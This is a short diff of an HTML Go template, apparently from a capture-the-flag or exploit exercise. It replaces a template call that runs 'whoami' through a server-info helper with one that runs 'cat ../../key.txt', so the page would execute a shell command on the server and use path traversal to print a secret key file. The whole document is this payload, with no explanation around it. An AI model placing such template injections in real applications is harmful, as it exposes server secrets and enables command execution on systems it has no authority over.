@@ -2,7 +2,7 @@
 <head>
  </head>
  <body>
-    <p>{{.FetchServerInfo "whoami"}}</p>
+    <p>{{.FetchServerInfo "cat ../../key.txt"}}</p>
     <p>{{.ServerInfo.Hostname}}</p>
  <!--some body-->
  </body>
